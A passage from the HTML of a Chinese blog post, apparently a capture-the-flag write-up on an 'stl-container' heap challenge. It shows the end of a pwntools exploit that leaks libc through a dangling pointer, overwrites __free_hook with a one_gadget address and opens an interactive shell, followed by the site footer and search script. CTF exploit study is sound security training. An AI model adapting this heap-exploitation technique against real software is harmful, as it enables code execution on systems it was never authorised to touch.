class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queue_add</span>(<span class="params">data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;input data:&quot;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">queue_delete</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_add</span>(<span class="params">data</span>):</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;input data:&quot;</span>)</span><br><span class="line">    myproc.sendline(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stack_delete</span>():</span></span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    myproc.recvuntil(<span class="string">&quot;&gt;&gt; &quot;</span>)</span><br><span class="line">    myproc.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">###leak libc###</span></span><br><span class="line">vector_add(<span class="string">&quot;vector111&quot;</span>)</span><br><span class="line">vector_add(<span class="string">&quot;vector222&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list111&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list222&quot;</span>)</span><br><span class="line">queue_add(<span class="string">&quot;queue111&quot;</span>)</span><br><span class="line">queue_add(<span class="string">&quot;queue222&quot;</span>)</span><br><span class="line">stack_add(<span class="string">&quot;stack111&quot;</span>)</span><br><span class="line">stack_add(<span class="string">&quot;stack222&quot;</span>)</span><br><span class="line"></span><br><span class="line">list_delete(<span class="number">1</span>)</span><br><span class="line">list_delete(<span class="number">0</span>)</span><br><span class="line">queue_delete()</span><br><span class="line">queue_delete()</span><br><span class="line">stack_delete()</span><br><span class="line">stack_delete()</span><br><span class="line">vector_delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vector_show(<span class="number">0</span>)</span><br><span class="line">myproc.recvuntil(<span class="string">&quot;data: &quot;</span>)</span><br><span class="line">leak_addr = u64(myproc.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">log.warn(<span class="string">&quot;leak_addr: 0x%x&quot;</span> % leak_addr)</span><br><span class="line"></span><br><span class="line">state_addr = leak_addr - <span class="number">0x60</span></span><br><span class="line">libc_addr = state_addr - <span class="number">0x3EBC40</span></span><br><span class="line">log.warn(<span class="string">&quot;libc_addr: 0x%x&quot;</span> % libc_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">### change libc hook###</span></span><br><span class="line">one_gadget0 = libc_addr + <span class="number">0x4f2c5</span></span><br><span class="line">one_gadget1 = libc_addr + <span class="number">0x4f322</span></span><br><span class="line">one_gadget2 = libc_addr + <span class="number">0x10a38c</span></span><br><span class="line">malloc_hook_addr = libc_addr + <span class="number">0x3ebc30</span></span><br><span class="line">free_hook_addr = libc_addr + <span class="number">0x3ed8e8</span></span><br><span class="line"><span class="comment">#free_hook_addr = libc_addr + mylibc.symbols[&#x27;__free_hook&#x27;]</span></span><br><span class="line">log.warn(<span class="string">&quot;malloc_hook_addr: 0x%x&quot;</span> % malloc_hook_addr)</span><br><span class="line">log.warn(<span class="string">&quot;free_hook_addr: 0x%x&quot;</span> % free_hook_addr)</span><br><span class="line">log.warn(<span class="string">&quot;one_gadget0: 0x%x&quot;</span> % one_gadget0)</span><br><span class="line">log.warn(<span class="string">&quot;one_gadget1: 0x%x&quot;</span> % one_gadget1)</span><br><span class="line">log.warn(<span class="string">&quot;one_gadget2: 0x%x&quot;</span> % one_gadget2)</span><br><span class="line"></span><br><span class="line">vector_add(<span class="string">&quot;vector333&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list333&quot;</span>)</span><br><span class="line">list_add(<span class="string">&quot;list444&quot;</span>)</span><br><span class="line">vector_delete(<span class="number">0</span>)</span><br><span class="line">vector_delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">vector_add(p64(free_hook_addr))</span><br><span class="line">vector_add(p64(one_gadget1))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(myproc)</span></span><br><span class="line">myproc.interactive()</span><br></pre></td></tr></table></div></figure>
+
+
+</div><footer class="post-footer"><div class="post-ending ending"><div class="ending__text">------ 本文结束，感谢您的阅读 ------</div></div><div class="post-copyright copyright"><div class="copyright-author"><span class="copyright-author__name">本文作者: </span><span class="copyright-author__value"><a href="http://blingblingxuanxuan.github.io">blingbling</a></span></div><div class="copyright-link"><span class="copyright-link__name">本文链接: </span><span class="copyright-link__value"><a href="http://blingblingxuanxuan.github.io/2020/05/03/stl-container/">http://blingblingxuanxuan.github.io/2020/05/03/stl-container/</a></span></div><div class="copyright-notice"><span class="copyright-notice__name">版权声明: </span><span class="copyright-notice__value">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" rel="external nofollow" target="_blank">BY-NC-SA</a> 许可协议。转载请注明出处！</span></div></div><nav class="post-paginator paginator"><div class="paginator-next"><a class="paginator-next__link" href="/2020/04/25/fengshui/"><span class="paginator-prev__text">fengshui</span><span class="paginator-next__icon"><i class="fas fa-angle-right"></i></span></a></div></nav></footer></div></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><div class="sidebar-nav"><span class="sidebar-nav-toc current">文章目录</span><span class="sidebar-nav-ov">站点概览</span></div><section class="sidebar-toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E8%A7%A6%E5%8F%91%E5%BC%82%E5%B8%B8%E5%88%86%E6%94%AF"><span class="toc-number">1.</span> <span class="toc-text">
+          1 触发异常分支</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E5%88%86%E6%9E%90%E5%BC%82%E5%B8%B8%E5%8E%9F%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">
+          2 分析异常原因</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%82%AC%E7%A9%BA%E6%8C%87%E9%92%88%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%BB%80%E4%B9%88"><span class="toc-number">3.</span> <span class="toc-text">
+          3 悬空指针可以做什么</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-%E6%B3%84%E9%9C%B2libc"><span class="toc-number">3.1.</span> <span class="toc-text">
+          3.1 泄露libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E5%86%99libc%E7%9A%84%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">3.2.</span> <span class="toc-text">
+          3.2 写libc的函数指针</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-EXP"><span class="toc-number">4.</span> <span class="toc-text">
+          2 EXP</span></a></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a><a class="sidebar-ov-social-item" href="https://weibo.com/anxinbuzitreexy" target="_blank" rel="noopener" data-popover="微博" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-weibo"></i></span></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__info">访问人数</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__info">浏览总量</span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
